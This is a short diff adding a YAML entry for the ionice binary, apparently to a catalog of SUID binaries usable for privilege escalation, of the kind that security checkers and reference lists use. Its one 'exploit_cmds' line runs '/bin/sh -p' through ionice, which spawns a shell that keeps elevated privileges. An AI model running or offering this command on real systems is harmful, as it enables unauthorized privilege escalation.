@@ -1,0 +1,4 @@
+name: ionice
+binary_path: /usr/bin/ionice
+exploit_cmds:
+- /usr/bin/ionice /bin/sh -p
